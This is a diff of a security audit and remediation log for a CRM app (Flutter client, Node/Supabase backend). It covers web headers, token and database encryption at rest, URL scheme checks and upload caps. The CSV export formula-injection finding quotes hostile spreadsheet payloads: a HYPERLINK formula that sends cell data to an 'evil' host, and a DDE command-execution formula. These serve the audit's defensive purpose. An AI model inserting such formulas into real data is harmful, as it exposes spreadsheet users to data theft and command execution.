-This is an API that returns JSON, so CSP/frame headers matter less here than on the HTML frontend — but the baseline is correct. Vercel also terminates TLS and adds HSTS at the edge, so transport is covered. **No action required on the API headers** beyond the CORS fail-open already tracked in B8.
+**Good baseline (unchanged):** `helmet()` on the API with strong defaults; 2 MB JSON body cap; broad Zod validation on write bodies; `.env`/`backend/.env` gitignored (only `.env.example` tracked); no service-role key in the Flutter client; `package-lock.json` committed.
 
-## 🟠 H1. Served web frontend has NO security headers — **A02:2025 Security Misconfiguration** — ✅ **FIXED 2026-06-25 (needs deploy verification)**
-> The web app is hosted on **Firebase Hosting** (not Vercel), so headers were added via a `hosting.headers` block in [exono/firebase.json](exono/firebase.json) (matched on `source: "**"`): HSTS (preload), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` (camera/mic `self`), and a Flutter-web-tuned CSP (`script-src 'self' 'wasm-unsafe-eval'`, `worker-src 'self' blob:`, `connect-src` for the API + Supabase + googleapis + firebaseio/firebaseapp, `frame-ancestors 'none'`). **Not yet verified against a live deploy** — re-deploy (`firebase deploy --only hosting`), confirm the Flutter web app still loads (wasm + drift worker, Firebase SDK calls) and tighten `connect-src` to the real runtime origins before relying on it.
+---
 
-### H1 (original)
-The Flutter **web** build is served as static HTML/JS (`exono/web/index.html`, `manifest.json`, wasm) — verified the app deploys to `exhibitioncrm.vercel.app`. There is **no `vercel.json` / `_headers` file for the frontend** (the only [backend/vercel.json](backend/vercel.json) has no `headers` block, and it builds the API, not the web app). The HTML app therefore ships with **no CSP, no HSTS, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy**. helmet does not help here — it only runs on the API, not on the static frontend.
-**Impact:** the actual user-facing origin (where any DOM-XSS, clickjacking, or MIME-sniffing would land) is the unprotected one. Clickjacking and missing CSP are live on the page that renders CRM data.
-**Fix:** add a `vercel.json` (or `web/_headers`) for the frontend deployment with at minimum:
-```json
-{
-  "headers": [{
-    "source": "/(.*)",
-    "headers": [
-      { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains; preload" },
-      { "key": "X-Content-Type-Options", "value": "nosniff" },
-      { "key": "X-Frame-Options", "value": "DENY" },
-      { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
-      { "key": "Permissions-Policy", "value": "camera=(self), microphone=(self), geolocation=()" },
-      { "key": "Content-Security-Policy", "value": "default-src 'self'; img-src 'self' data: https:; connect-src 'self' https://exhibitioncrm.vercel.app https://*.supabase.co; object-src 'none'; base-uri 'self'; frame-ancestors 'none'" }
-    ]
-  }]
-}
-```
-Tune `script-src`/`connect-src`/`worker-src` for Flutter web's wasm + drift worker (`'wasm-unsafe-eval'` and `worker-src 'self' blob:` are typically required). Note `camera`/`microphone` are `self` because the app uses card-scan + voice capture.
+# Web frontend (served HTML/JS) findings
 
-## 🟡 H2. CSV export formula injection (CSV/Excel injection) — **A05:2025 Injection** — ✅ **FIXED 2026-06-25**
-> [backend/src/routes/export.ts](backend/src/routes/export.ts) `/csv` now (1) wraps every field in double quotes with embedded quotes doubled (RFC-4180), so commas/newlines can't break out of a cell, and (2) prefixes any field starting with `= + - @` or a leading tab/CR with a single quote so spreadsheet apps treat it as text. Rows are joined with `\r\n`. **HTTP-verified:** a contact named `=HYPERLINK("http://evil")` exported as `"'=HYPERLINK(""http://evil"")"` (formula neutralized, quotes doubled); a name `a,b` exported as `"a,b"` (no column breakout). **Note:** `/export/excel` (the `exceljs`/`xlsx` path) was not changed here — verify its sheet writer applies the same formula guard.
-
-### H2 (original)
-[backend/src/routes/export.ts:62-71](backend/src/routes/export.ts#L62-L71) builds the export with `r.join(',')` — **no field quoting and no formula-prefix neutralization**. Exported fields (`first_name`, `last_name`, `job_title`, `company`, etc.) are user-controlled: the write schema ([contacts.ts:11](backend/src/routes/contacts.ts#L11)) only trims/length-limits `first_name`, so a value like `=HYPERLINK("http://evil/?"&A1,"click")` or `=cmd|'/c calc'!A0` is stored verbatim and emitted into the CSV.
-**Impact:** when the victim opens the exported `contacts.csv` in Excel/Sheets, the cell executes as a formula — data exfiltration (HYPERLINK/WEBSERVICE) or, with legacy DDE, command execution. Also, a name containing `,` or a newline corrupts/injects CSV columns since fields are unquoted.
-**Fix:** (1) wrap every field in double quotes and escape embedded quotes (`"" `), and (2) prefix any field beginning with `= + - @` (or tab/CR) with a single quote `'` before export. Better: use a CSV library (`csv-stringify`) configured to quote all fields, plus the formula-guard step.
+### H1. Web frontend security headers — ✅ **FIXED (Firebase Hosting), verify on deploy**
+The Flutter **web** build is served from **Firebase Hosting** (project `exono-ad7a4`). [exono/firebase.json](exono/firebase.json) now sets, on `source: "**"`: HSTS (preload), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` (camera/mic `self`, geolocation off), and a Flutter-web-tuned CSP (`script-src 'self' 'wasm-unsafe-eval'`, `worker-src 'self' blob:`, `connect-src` for the API + `*.supabase.co` + `*.googleapis.com` + `*.firebaseio.com` + `*.firebaseapp.com`, `frame-ancestors 'none'`, `object-src 'none'`).
+**Residual:** confirm against a live deploy that the app loads (wasm + drift worker + Firebase SDK), then tighten `connect-src`/`img-src` to the real runtime origins (currently `img-src 'self' data: https:` is broad).
 
 ---
 
@@ -292,178 +408,118 @@ Tune `script-src`/`connect-src`/`worker-src` for Flutter web's wasm + drift work
 
 ## 🔴 Critical
 
-### C1. Auth tokens stored in plaintext (`SharedPreferences`) — M9: Insecure Data Storage · M1: Improper Credential Usage
-[auth_provider.dart:110-111](exono/lib/providers/auth_provider.dart#L110-L111), [api_service.dart:30-31](exono/lib/services/api_service.dart#L30-L31)
-`access_token` and `refresh_token` are written to unencrypted `SharedPreferences` (Android XML / iOS plist). Recoverable on rooted/jailbroken devices or via backup extraction. The refresh token grants long-lived account takeover.
-**Fix:** use `flutter_secure_storage` (Keychain / Android Keystore-backed EncryptedSharedPreferences) for both tokens.
+### C1. Auth tokens stored in plaintext `SharedPreferences` — **M9 / M1** — ✅ **FIXED 2026-06-30 (`flutter_secure_storage`; flutter analyze clean)**
 
-### C2. Local offline database is unencrypted — M9: Insecure Data Storage
-[exono/lib/db/tables/](exono/lib/db/tables/) — `contacts_table`, `companies_table`, `interactions_table`, `email_drafts_table`, etc. The full CRM dataset (names, emails, phones, company intel, interaction notes, AI email drafts) is mirrored offline in a plain SQLite/Drift DB with no encryption. Also relevant to **M6: Inadequate Privacy Controls** (PII at rest).
-**Fix:** use SQLCipher (`sqflite_sqlcipher` / Drift encrypted executor), with the DB key held in secure storage.
+> **Fix applied & verified.** Added `flutter_secure_storage: ^9.2.2` (resolved 9.2.4). [auth_provider.dart](exono/lib/providers/auth_provider.dart) now stores `access_token` + `refresh_token` (C1) **and** `cached_user`/`cached_profile`/`session_last_verified_ms` (C9 residual) in `FlutterSecureStorage(aOptions: AndroidOptions(encryptedSharedPreferences: true))` — iOS Keychain / Android Keystore-backed EncryptedSharedPreferences. A one-time `_migrateFromPrefsIfNeeded()` (called in `initialize()` before the first token read) copies any surviving plaintext values into secure storage and removes them from prefs, so existing sessions are NOT logged out. `_clearSession()` deletes all five keys from secure storage. **Sweep:** zero `prefs.get/set/remove` calls remain for any sensitive key (the only `getString` left is inside the migration helper reading the legacy value to copy it); the non-sensitive `selected_mode` UI flag correctly stays in prefs. `flutter analyze lib`: no issues.
+
+Original finding (for reference):
+[auth_provider.dart](exono/lib/providers/auth_provider.dart) writes `access_token` and `refresh_token` to unencrypted `SharedPreferences` (≈12 call sites). `flutter_secure_storage` is **not** in [exono/pubspec.yaml](exono/pubspec.yaml). Recoverable on rooted/jailbroken devices or via backup extraction; the refresh token grants long-lived account takeover.
+**Fix:** add `flutter_secure_storage` (Keychain / Android Keystore `EncryptedSharedPreferences`) and move both tokens there. Do this together with C9.
+
+### C2. Offline Drift/SQLite DB is unencrypted — **M9** — ✅ **FIXED 2026-06-30 (SQLCipher; flutter analyze clean)**
+
+> **Fix applied & verified.** Added `sqlcipher_flutter_libs: ^0.6.0` (resolved 0.6.8). [connection_native.dart](exono/lib/db/connection/connection_native.dart) opens the Drift `NativeDatabase.createInBackground` with a `setup:` callback that runs `PRAGMA key`. The 256-bit key is generated once (`Random.secure`, base64Url), stored in `FlutterSecureStorage` under `db_encryption_key`, and reused on every open (key never leaves secure storage). The old-Android SQLCipher `.so` workaround (`applyWorkaroundToOpenSqlCipherOnOldAndroidVersions`) is correctly placed in **`isolateSetup`** so it runs on the same background isolate `createInBackground` opens on (the original agent draft had it on the main isolate — fixed after checking the Drift encryption docs). **Plaintext-DB migration:** the lazy opener checks the file's first 16 bytes for the `"SQLite format 3 "` magic; a legacy un-encrypted DB is deleted before open (the local DB is a sync cache — re-syncs from server), so `AppDatabase()` self-heals with **no caller wiring required** (a redundant `openOrRecreate()` factory also exists). `flutter analyze lib`: no issues. *Residual:* SQLCipher native linkage can only be fully confirmed by a device build (the analyzer can't exercise the `.so`); recommend a smoke build on a physical Android + iOS device.
+
+Original finding (for reference):
+[exono/lib/db/app_database.dart](exono/lib/db/app_database.dart) opens the local DB via a plain `openConnection()` with no SQLCipher / encrypted executor. The full offline CRM mirror (contacts, companies, interactions, email drafts, notes) sits in a plaintext SQLite file. Also M6 (PII at rest).
+**Fix:** SQLCipher (`sqlcipher_flutter_libs` + Drift `NativeDatabase` with a key) with the key in secure storage (C1).
 
 ---
 
 ## 🟠 High
 
-### C3. Malformed base URL — no scheme → broken transport — M5: Insecure Communication — ✅ **FIXED 2026-06-25**
-> [api_config.dart](exono/lib/config/api_config.dart) default is now `https://exhibitioncrm.vercel.app/api`, and `ApiConfig.assertSecure()` (called from [main.dart](exono/lib/main.dart)) asserts the configured base URL parses as an absolute `https://` URL at startup. Also restores the missing `/api` path prefix.
+### C9. Offline session restore from cached identity — **M9 / M1** — ✅ **FIXED 2026-06-30 (identity cache moved to secure storage, with C1)**
 
-### C3 (original)
-[api_config.dart:5](exono/lib/config/api_config.dart#L5): `defaultValue: 'exhibitioncrm.vercel.app'` (no `https://`).
-Verified: `Uri.parse('exhibitioncrm.vercel.app/auth/login')` yields `scheme="" host="" path="exhibitioncrm.vercel.app/auth/login"` — a relative URI with no host. Production requests don't get an explicit HTTPS host; the `/api` path prefix is also missing vs the commented localhost default. No guarantee of TLS, and likely a functional break on native.
-**Fix:** `defaultValue: 'https://exhibitioncrm.vercel.app/api'`; assert the scheme is `https` at startup.
+> **At-rest residual closed.** `cached_user`, `cached_profile`, and `session_last_verified_ms` now live in `FlutterSecureStorage` (see C1), not plaintext `SharedPreferences` — so they are no longer attacker-writable on a rooted device via a plain prefs file. The in-code mitigations (network-failure-only offline restore, 7-day grace window, fail-closed on garbled timestamps, server re-verification on next online request) were already in place and are unchanged.
 
-### C4. No certificate pinning + cleartext not explicitly disabled — M5: Insecure Communication — 🟡 **PARTIALLY FIXED 2026-06-25**
-> ✅ `android:usesCleartextTraffic="false"` now set on the `<application>` in [AndroidManifest.xml](exono/android/app/src/main/AndroidManifest.xml). ✅ iOS has no `NSAppTransportSecurity`/`NSAllowsArbitraryLoads` override, so ATS default-deny (cleartext blocked) is already in force — left as-is intentionally. ⚠️ **Cert pinning NOT added** — still recommended for the API host given the PII threat model.
-
-### C4 (original)
-No `usesCleartextTraffic="false"` / network-security-config in [AndroidManifest.xml](exono/android/app/src/main/AndroidManifest.xml), no `NSAppTransportSecurity` block in iOS `Info.plist`, and no TLS pinning. MITM on a hostile network is in scope for a CRM holding customer PII.
-**Fix:** set `android:usesCleartextTraffic="false"` (or a network-security-config disallowing cleartext), keep ATS default-deny on iOS, consider cert pinning on the API host.
+Original finding (for reference):
+Offline-resume restores a session from cached identity only when the session check failed due to *no connectivity* (network failures are tagged `'network': true`; a server rejection still routes to `_clearSession()` → logout). A 7-day offline grace window (`session_last_verified_ms`) bounds offline lifetime; fail-closed on missing/garbled/rolled-back timestamps. The backend re-verifies every token on the next online request, so offline-restore grants **no new server access**.
+**Residual (the C1 follow-up):** `cached_user`, `cached_profile`, and `session_last_verified_ms` live in plaintext `SharedPreferences` and are attacker-writable on a rooted device (tampering impact limited to client-side navigation — zero server access, since the backend never trusts client state). The grace-window timestamp is editable, so it's a speed bump, not a cryptographic control. **Fix with C1/C2** — move tokens + identity cache into secure storage.
 
 ---
 
-## 🟡 Medium
+## 🟡 Medium / informational
 
-### C5. `url_launcher` opens server-controlled URLs unvalidated — M4: Insufficient Input/Output Validation — ✅ **FIXED 2026-06-25**
-> Both `_launchUrl` ([contact_detail_screen.dart](exono/lib/screens/contact_detail_screen.dart)) and `_openAsset` ([contact_links_files_sheet.dart](exono/lib/screens/contact_links_files_sheet.dart)) now reject any URI whose scheme is not in `{http, https, mailto, tel}` before calling `launchUrl`, so `javascript:`/`intent:`/`file:` from server or import data can no longer be launched.
+### C3. Base URL scheme — ✅ **FIXED**
+[api_config.dart](exono/lib/config/api_config.dart) default is `https://exhibitioncrm.vercel.app/api`; `assertSecure()` asserts an absolute `https://` (or localhost `http`) at startup.
 
-### C5 (original) — **Re-verified (2026-06-24)**
-Two call sites pass a raw `Uri.tryParse(...)` straight into `launchUrl(..., LaunchMode.externalApplication)` with **no scheme allowlist**, on strings that originate from backend/import data:
-- [contact_detail_screen.dart:146](exono/lib/screens/contact_detail_screen.dart#L146) `_launchUrl` — used for `contact.linkedinUrl` etc.
-- [contact_links_files_sheet.dart:242](exono/lib/screens/contact_links_files_sheet.dart#L242) `_openAsset` — launches `asset.url` directly.
+### C4. Cleartext / ATS / pinning — 🟡 **PARTIAL**
+✅ `android:usesCleartextTraffic="false"` set ([AndroidManifest.xml:14](exono/android/app/src/main/AndroidManifest.xml#L14)). ✅ iOS ATS default-deny in force (no `NSAllowsArbitraryLoads`). ⚠️ **Cert pinning NOT added** — still recommended for the API host given the PII threat model.
 
-A malicious imported contact/asset could carry `javascript:`, `intent:`, or `file:` schemes.
-**Note:** [company_detail_screen.dart:94](exono/lib/screens/company_detail_screen.dart#L94) is *not* affected — it prepends `https://` when the string doesn't start with `http`, which neutralizes non-http schemes. The two sites above have no such guard.
-**Fix:** validate `uri.scheme ∈ {http, https, mailto, tel}` before launching, in both `_launchUrl` and `_openAsset`.
+### C5. `url_launcher` scheme allowlist — ✅ **FIXED**
+Both `_launchUrl` ([contact_detail_screen.dart:174](exono/lib/screens/contact_detail_screen.dart#L174)) and `_openAsset` reject any scheme outside `{http, https, mailto, tel}` before `launchUrl`.
 
-### C6. Firebase API keys committed in source — informational — M1: Improper Credential Usage
-[firebase_options.dart:44-80](exono/lib/firebase_options.dart#L44-L80) — these `AIza...` keys are **client identifiers, not secrets** (Google ships them in apps by design), so not a leak by itself. **But** Firebase security then depends entirely on backend rules + key restrictions. Verify: (a) Firebase Security Rules are locked down, (b) keys are restricted by app package/SHA in the Google Cloud console. If rules are open, this becomes critical.
+### C6. Firebase API keys committed — informational (unchanged)
+`AIza...` keys in [firebase_options.dart](exono/lib/firebase_options.dart) are **client identifiers, not secrets**. Security depends on Firebase Security Rules + Google Cloud API-key restrictions (by package/SHA). **Verify those are locked down** — if rules are open this becomes critical.
 
-### C7. CSV/file import sent without client-side type/size validation — M4 / (server: A03/A05:2025)
-[api_service.dart:744-776](exono/lib/services/api_service.dart#L744-L776) (`importEventTargets`, `importContacts`) — raw `Uint8List` is multipart-posted with no size cap or content-type check. The server parses it with the vulnerable `xlsx` lib (B3/B10).
-**Fix:** cap size / check extension client-side; harden the server parser.
+### C7. Import upload — client-side caps still recommended — ✅ **FIXED 2026-06-30 (picker constrained + 10 MB client cap)**
 
-### C8. No binary hardening / tamper detection — M7: Insufficient Binary Protections (informational)
-No evidence of code obfuscation, root/jailbreak detection, or integrity checks. For a CRM this is lower priority than C1/C2 but worth noting under the 2024 mobile list, especially given secrets like Firebase keys ship in the binary.
-**Fix (optional):** build with `--obfuscate --split-debug-info`; consider root/jailbreak detection if threat model warrants.
+> **Fix applied & verified.** Both import pickers ([pre_event_prep_screen.dart:374](exono/lib/screens/pre_event_prep_screen.dart#L374), [contacts_screen.dart:624](exono/lib/screens/contacts_screen.dart#L624)) now use `FileType.custom` + `allowedExtensions: ['csv','xlsx','xls']` and reject files over `10 * 1024 * 1024` bytes with a toast before upload (mounted-guarded). `flutter analyze` on both files: no issues. The server (B10) remains the real boundary — this is UX + defense-in-depth.
 
-### C9. Offline session restore from cached identity — M9: Insecure Data Storage / M1: Improper Credential Usage — 🟡 **MITIGATED IN CODE 2026-06-26; cache-at-rest hardening still OPEN**
-> **Context — why this exists.** Previously, resuming the app while offline logged the user out: `AuthProvider.initialize()` called `getSession(token)`, the network call failed, and the failure was indistinguishable from a rejected token, so it fell through to `_clearSession()`. Since you cannot log in while offline, this stranded offline users. The fix (2026-06-26) restores an authenticated session from cached identity when — and only when — the session check failed due to *no connectivity*, not a server rejection.
->
-> **Threat model — what this does and does NOT grant.** Offline-restore grants **no new access to server data**: the backend `requireAuth` ([requireAuth.ts](backend/src/middleware/requireAuth.ts)) re-verifies the token via `supabaseAuth.auth.getUser()` and 401s any expired/revoked/invalid token on the next online request — so every real fetch/write is still server-enforced. The cached token was already in `SharedPreferences` before this change (cf. **C1**), so an attacker with the device gained nothing new there. The one *new* exposure it could have introduced is **indefinite offline access**: a stolen device kept in airplane mode reading cached CRM data / queuing writes forever with a dead session.
->
-> **Controls enforced in code** ([auth_provider.dart](exono/lib/providers/auth_provider.dart), [auth_service.dart](exono/lib/services/auth_service.dart)):
-> - **Network vs. rejection is explicit, not inferred.** `getSession`/`refresh` tag genuine network failures with `'network': true`. A server rejection (`success:false` *without* the flag) still routes straight to `_clearSession()` → logout. Only a true offline failure keeps the session.
-> - **Offline grace window** (`_offlineGraceDuration = 7 days`). Every *confirmed server verification* stamps `session_last_verified_ms`. Offline restore is refused once that timestamp is older than the window, bounding how long a device can stay authenticated without ever reaching the server. Tune to risk appetite.
-> - **Fail closed.** Missing/garbled timestamp ⇒ no restore. Negative elapsed time (clock rolled back to dodge the cap) ⇒ no restore.
-> - **Full teardown on logout / real 401.** `_clearSession` removes `cached_user`, `cached_profile`, and `session_last_verified_ms` alongside the tokens; `onUnauthorized` (a real server 401) still forces logout.
-> - **Deliberate non-control:** the *access* token's `exp` is NOT hard-gated, because access tokens are ~1h and cannot be refreshed offline — enforcing it would break legitimate offline use after an hour. The grace window is the lifetime control instead.
->
-> **Residual risk — STILL OPEN (this is the `flutter_secure_storage` follow-up):**
-> - `cached_user` / `cached_profile` live in **plaintext `SharedPreferences`** and are attacker-writable on a rooted device or via backup extraction (same root cause as **C1** tokens / **C2** offline DB). Tampering impact is currently limited to **client-side navigation** (e.g. flipping `onboarding_completed` to skip an onboarding screen) — it grants **zero** server access, since the backend never trusts client state. But it is unverified trust at rest.
-> - The `session_last_verified_ms` timestamp is likewise plaintext and editable, so a determined local attacker can extend the offline grace window by rewriting it. The grace window is a *speed bump*, not a cryptographic control.
-> **Fix (follow-up):** move tokens **and** the auth identity cache (`cached_user`, `cached_profile`, `session_last_verified_ms`) into `flutter_secure_storage` (Keychain / Android Keystore-backed `EncryptedSharedPreferences`). This is the same remediation as **C1** and should be done together — once the cache is integrity-protected at rest, the tamper residue above closes too. Larger change (touches every read/write of these keys); flagged, not yet done.
+Original finding (for reference):
+The import path posts raw bytes; the **server** now caps size and sniffs type (B10), so the critical gap is closed server-side. Adding a client-side size/extension check is a UX/defense-in-depth nicety, not load-bearing.
 
----
+**Verified gap (2026-06-30):** both import pickers use `FileType.any` with no extension allowlist and no size check — [pre_event_prep_screen.dart:374](exono/lib/screens/pre_event_prep_screen.dart#L374) and [contacts_screen.dart:624](exono/lib/screens/contacts_screen.dart#L624). (Contrast: the chat-attachment picker already does it right — `FileType.custom` + `allowedExtensions`, [exo_chat_view.dart:486](exono/lib/widgets/exo_chat_view.dart#L486).)
 
-# Good practices observed 🟢
+**Fix (documented; not yet applied):**
+1. Constrain the picker to the formats the importer accepts:
+   ```dart
+   await FilePicker.platform.pickFiles(
+     type: FileType.custom,
+     allowedExtensions: ['csv', 'xlsx', 'xls'],
+     withData: true,
+   );
+   ```
+2. After picking, reject oversized files **before** uploading, with a friendly message — mirror the server cap so the two agree (server import cap; image cap is `MAX_IMAGE_BYTES` = 5 MB, docs `MAX_DOC_BYTES` = 15 MB in [document-extraction.ts](backend/src/services/document-extraction.ts)):
+   ```dart
+   const maxImportBytes = 10 * 1024 * 1024; // keep <= the server import cap
+   if ((file.size) > maxImportBytes) { showAppToast(context, 'File too large (max 10 MB)'); return; }
+   ```
+This is UX + defense-in-depth only — the server (B10) remains the real boundary; a client that bypasses the app still hits the server caps/sniffing.
 
-**Backend**
-- All tables have RLS enabled (right baseline; load-bearing for the `conversations` path).
-- `helmet()` applied; JSON body capped at 2 MB.
-- Strong **Zod validation** on most write bodies (length caps, email/URL/UUID formats) — strong mitigation for A05:2025 Injection.
-- `conversations.ts` correctly uses the **RLS-enforcing user client** — the model to extend everywhere.
-- UUID validation on many `:id` params.
-- `package-lock.json` committed → dependencies pinned (helps A03:2025).
-- `.env` files are **not** committed (only `.env.example` tracked; `backend/.gitignore` covers `.env`).
-- Request logging middleware present (A09 baseline; needs alerting added).
+### C8. No binary hardening / tamper detection — M7 — ✅ **FIXED 2026-06-30 (obfuscation + soft root/jailbreak warning)**
 
-**Client**
-- 401 handling is centralized via `checkUnauthorized` → forced logout ([api_service.dart:17-22](exono/lib/services/api_service.dart#L17-L22)).
-- No sensitive logging (no `print`/`debugPrint` of tokens or response bodies found).
-- Idempotency keys on mutating POSTs.
-- `.env` gitignored; Supabase config injected via `--dart-define`.
-- Query params encoded with `Uri.encodeComponent`.
+> **Step 1 (obfuscation) applied.** The release iOS build in [codemagic.yaml](codemagic.yaml) now runs `flutter build ios --release --no-codesign --obfuscate --split-debug-info=build/debug-symbols ...` (the only release build in the file). YAML re-validated.
+> **Step 2 (root/jailbreak detection) applied.** Added `flutter_jailbreak_detection: ^1.10.0`. New `DeviceIntegrityService.isCompromised()` ([device_integrity_service.dart](exono/lib/services/device_integrity_service.dart)) checks `FlutterJailbreakDetection.jailbroken` (+ `.developerMode` on Android), returns false on web/any error (never crashes). Wired in [splash_screen.dart](exono/lib/screens/splash_screen.dart) `_navigate()` (line ~64): on a compromised device it shows a single-OK `showAppConfirmDialog` warning, then **proceeds to navigation regardless** — soft signal, non-blocking, once per launch (no hard gate → no false-positive lockouts, per the finding's guidance). `flutter analyze`: clean.
+
+Original finding (for reference):
+No obfuscation / root-jailbreak detection. Lower priority than C1/C2 (fix those first — they protect the actual at-rest data). Verified 2026-06-30: the CI release build ([codemagic.yaml:38](codemagic.yaml#L38)) runs `flutter build ios --release` **without** `--obfuscate --split-debug-info`.
+
+**Fix (documented; not yet applied) — two independent, optional steps:**
+1. **Dart obfuscation** — add the flags to every release build in [codemagic.yaml](codemagic.yaml) (and any local release command):
+   ```sh
+   flutter build ios --release --obfuscate --split-debug-info=build/debug-symbols ...
+   flutter build apk --release --obfuscate --split-debug-info=build/debug-symbols ...
+   ```
+   `--split-debug-info` writes the symbol map separately so YOU can still de-obfuscate crash reports (keep `build/debug-symbols` as a CI artifact, don't ship it). Scrambles identifiers so a pulled APK/IPA is far harder to reverse. No code change, just build flags.
+2. **Root / jailbreak detection (optional, heavier)** — add a package such as `flutter_jailbreak_detection` and, on startup, warn or restrict on a compromised device. This is a soft signal (defeatable), so use it to *raise effort*, not as a hard gate — e.g. surface a warning rather than hard-blocking, to avoid false-positive lockouts.
+
+Both raise attacker effort but fix no specific vulnerability; **do C1/C2 (encrypt tokens + offline DB) first.** Note: obfuscation does NOT protect the shipped Firebase/anon keys (those are public client identifiers anyway — see C6).
+
+### Client good practices (verified)
+401 handling centralized → forced logout; no token/body logging; idempotency keys on mutating POSTs; Supabase anon key + API base injected via `--dart-define`; query params encoded.
 
 ---
 
-# Remediation priority
+# Remediation priority (2026-06-30)
 
-1. ~~**B1 / B5 / B6 — Broken Access Control + mass-assignment (A01:2025).**~~ ✅ **DONE 2026-06-24** via the RLS migration (B1/B5 closed structurally by the user client; B6 by an allowlist Zod schema) — see "Remediation applied". The migration also uncovered and fixed **B12** (`contact_events` `{public}` allow-all policy). **B2 (companies write authorization) is NOT done** — see item 1b. Remaining A01 priority is now B2.
-1b. **B2 — `companies` write authorization (A01:2025).** Still open. Reads are RLS-scoped but `POST`/`PATCH /companies` run as service_role with no linkage check — any user can poison any company. Decide shared-reference-with-controlled-writes vs per-tenant `user_id`, then enforce it.
-2. **B3 — Patch the supply chain (A03:2025).** `npm audit fix` for `ws`; replace/pin `xlsx`; add audit to CI. (Reachable via import path.)
-3. **C1 / C2 / C9 — Encrypt tokens, the auth identity cache, and the offline DB** on the client (`flutter_secure_storage` + SQLCipher). C9 (offline session restore) is mitigated in code via a network-vs-rejection split + a 7-day offline grace window, but the cached identity/timestamp it relies on are still plaintext — move them into secure storage alongside the C1 tokens.
-4. **C3 — Fix the base URL scheme** (also a functional bug) and assert HTTPS.
-5. **B4 / B8 — Stop leaking error details; fail-closed CORS (A10:2025).**
-6. **B9 / B10 — Revoke the public RPC; lock the avatars bucket (A02:2025)** (one-line Supabase changes each).
-7. **C4 — Disable cleartext / add ATS; evaluate cert pinning (M5).**
-8. **B11 — Add rate limiting + abuse alerting; enable leaked-password protection (A07/A09:2025).**
-9. **B7 — Harden LLM prompts (A05:2025)** once B1 is closed.
-10. **H1 — Add security headers to the web frontend deployment (A02:2025).** The API headers (helmet) are fine; the served HTML app has none — add `vercel.json`/`_headers` with CSP, HSTS, X-Frame-Options, etc.
-11. **H2 — Neutralize CSV formula injection in `/export/csv` (A05:2025).** Quote all fields and prefix `= + - @` values.
-10. **C5 / C6 / C7 / C8 — URL scheme validation; confirm Firebase rules; cap import size; optional binary hardening.**
+1. **B2 — `companies` write authorization (A01:2025, Critical).** Design agreed (shared-reference + linkage-gated hint PATCH): add `ownsCompanyLinkage` to gate `PATCH /companies/:id` (descriptive fields already AI-only), keep `POST` open, couple with B7 fencing. Create-path anti-junk deferred (residual abuse risk). See B2 above.
+2. **C1 / C2 / C9 — Encrypt tokens, offline DB, and identity cache on the client.** `flutter_secure_storage` + SQLCipher; do all three together.
+3. **B3 — Supply chain (A03:2025).** Replace `xlsx` with `exceljs` (or pin patched SheetJS); bump `uuid`/`exceljs`; add `npm audit`/Dependabot to CI.
+4. **B11 — Rate-limit `/auth/*` + enable leaked-password protection + add abuse alerting (A07/A09).**
+5. **B9 / B13 / B10 — Revoke `SECURITY DEFINER` RPCs from anon; document/lock `scoped_rate_limits`; lock the avatars bucket SELECT (A02:2025).** (`/upload` stub already removed.)
+6. **B14 / B15 / B16 — `FORCE` RLS on the 4 new tenant tables; move `vector` out of `public`; pin function `search_path` (A02:2025, defense-in-depth).**
+7. **B7 — Route legacy LLM-endpoint DB text through `fenceUntrusted` (after B2) (A05:2025/LLM01).**
+8. **H1 residual — verify web headers on a live deploy and tighten `connect-src`/`img-src`.**
+9. **C4 — Evaluate cert pinning (M5).**
+10. **C6 / C8 — Confirm Firebase rules + API-key restrictions; optional binary hardening.**
 
 ---
 
-# Items requiring further verification
+# Items requiring further verification (not closed by this pass)
 
-- **Broken Access Control (A01:2025)** — re-audit progress (2026-06-24): `events.ts` (now guarded by `router.param`), `contacts.ts` (timeline open — B1), `followUps.ts` (B6 mass-assignment), and the `events follow-ups` write (B5) have been verified. Still to trace: `captures.ts`, `interactions.ts`, `dashboard.ts`, `emails.ts`, `documents.ts`, `export.ts`, `sync.ts`. `captures.ts POST` also reads an `event_id` from the body to fetch an event name with no `user_id` filter (minor cross-tenant name leak — low impact, worth scoping).
-- **SSRF (now under A01:2025):** enrichment/Tavily and any URL-fetching server code (`enrichment-service.ts`, company `website` fetches) should be checked for server-side request forgery — not yet reviewed.
-- **Full `npm audit` triage** — 15 findings total; only the 2 reachable highs detailed. Run `npm audit` and review the remaining moderates.
-- **Firebase Security Rules** and Google Cloud API-key restrictions (see C6).
-- **CSV formula-injection** handling and row/size caps in `import.ts`.
-
----
-
-## Re-review — 2026-06-24 (security-review skill, full frontend + backend pass)
-
-This pass independently re-traced the backend route layer and the Flutter client. It **confirms** some prior findings, **retracts** one, and adds confidence notes. Only HIGH-confidence, exploitable items are reported.
-
-### Confirmed findings
-
-#### [R-01] IDOR — contact timeline & sub-resources not ownership-scoped 🟠 High
-- **Location:** `backend/src/routes/contacts.ts:358` (`GET /api/contacts/:id/timeline`)
-- **OWASP:** A01:2025 Broken Access Control (matches prior **B1**)
-- **Issue:** `contacts.ts` has **no `router.param('id')` ownership guard** (unlike `events.ts`). The timeline handler queries `interactions` and `captures` filtered only by `contact_id = req.params.id` using the **service-role** `supabase` client, which bypasses RLS. No `user_id` check is performed.
-- **Impact:** Any authenticated user can read another user's full contact interaction history / captures (notes, summaries, image URLs) by supplying a victim's contact UUID.
-- **Fix:** Add a `router.param('id', …)` guard to `contacts.ts` mirroring the one in `events.ts:69` (look up the contact, 404 if missing, 403 if `user_id !== req.user.id`), or add an explicit ownership pre-check in `/:id/timeline` before querying child tables. Note `/:id`, `/:id/insights`, `/:id/events`, PATCH/PUT/DELETE already scope by `user_id`; the timeline route is the gap.
-
-#### [R-02] Cross-tenant event-name leak in capture creation 🟡 Medium — ✅ **FIXED 2026-06-25 (HTTP pen-tested)**
